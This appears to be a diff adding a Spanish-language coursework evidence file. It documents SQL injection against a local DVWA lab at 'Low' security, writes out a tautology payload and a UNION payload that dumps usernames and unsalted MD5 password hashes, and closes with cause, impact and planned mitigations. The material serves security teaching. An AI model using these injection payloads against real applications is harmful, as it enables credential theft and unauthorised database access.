@@ -1,0 +1,47 @@
+EVIDENCIA DE AVANCE - ATAQUE 1: INYECCION SQL (DVWA, nivel Low)
+Fecha: 2026-10-26 20:45  |  Objetivo: http://127.0.0.1:4280 (laboratorio aislado)
+================================================================
+
+PAYLOAD 1 (bypass de la logica):   1' OR '1'='1
+URL:  /vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit
+RESULTADO -> la aplicacion devuelve TODOS los usuarios (no solo el id=1):
+   ID: 1' OR '1'='1
+   First name: admin
+   Surname: admin
+   ID: 1' OR '1'='1
+   First name: Gordon
+   Surname: Brown
+   ID: 1' OR '1'='1
+   First name: Hack
+   Surname: Me
+   ID: 1' OR '1'='1
+   First name: Pablo
+   Surname: Picasso
+   ID: 1' OR '1'='1
+   First name: Bob
+   Surname: Smith
+
+PAYLOAD 2 (UNION - exfiltracion de credenciales):
+   1' UNION SELECT user, password FROM users -- -
+RESULTADO -> se extraen usuarios y sus hashes MD5 (sin sal) de la BD:
+   First name: admin
+   First name: admin
+   Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+   First name: gordonb
+   Surname: e99a18c428cb38d5f260853678922e03
+   First name: 1337
+   Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
+   First name: pablo
+   Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
+   First name: smithy
+   Surname: 5f4dcc3b5aa765d61d8327deb882cf99
+
+LECTURA:
+ - Causa: la entrada del usuario se concatena directamente en la consulta SQL.
+ - Impacto: lectura total de la tabla 'users', incluidas las contrasenas.
+ - Nota cripto: los hashes son MD5 SIN SAL (5f4dcc3b...=password), facilmente
+   rompibles. La mitigacion combina consultas parametrizadas (anti-SQLi) +
+   almacenamiento con bcrypt/sal (ver scripts/demo_hash_passwords.py).
+
+MITIGACION A PROBAR DESPUES: subir DVWA a nivel 'High' y repetir -> el payload
+no debe devolver datos (consultas parametrizadas).
